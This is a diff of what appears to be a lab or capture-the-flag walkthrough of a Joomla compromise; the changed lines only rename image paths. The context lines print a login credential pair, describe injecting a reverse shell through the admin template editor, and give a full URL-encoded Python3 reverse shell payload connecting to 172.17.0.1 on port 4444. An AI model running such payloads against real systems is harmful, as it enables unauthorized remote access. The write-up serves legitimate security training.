@@ -221,21 +221,21 @@ The credential pair was `admin:sanluis12345`.
 
 The decoded credentials were used to log in at `/administrator/`.
 
-![](image.png)
+![](images/img.png)
 
 **6. Navigating to the Template Editor**
 
 From the Joomla admin panel, the template PHP editor was accessed to inject a reverse shell payload.
 
-![](image-1.png)
+![](images/img-1.png)
 
-![](image-2.png)
+![](images/img-2.png)
 
-![](image-3.png)
+![](images/img-3.png)
 
-![](image-4.png)
+![](images/img-4.png)
 
-![](image-5.png)
+![](images/img-5.png)
 
 **7. Delivering the Reverse Shell**
 
@@ -251,7 +251,7 @@ The URL-encoded Python3 socket reverse shell payload was injected into the templ
 
 Payload: `python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22172.17.0.1%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27`
 
-![](image-6.png)
+![](images/img-6.png)
 
 **8. Catching the Shell and Stabilising the TTY**
 
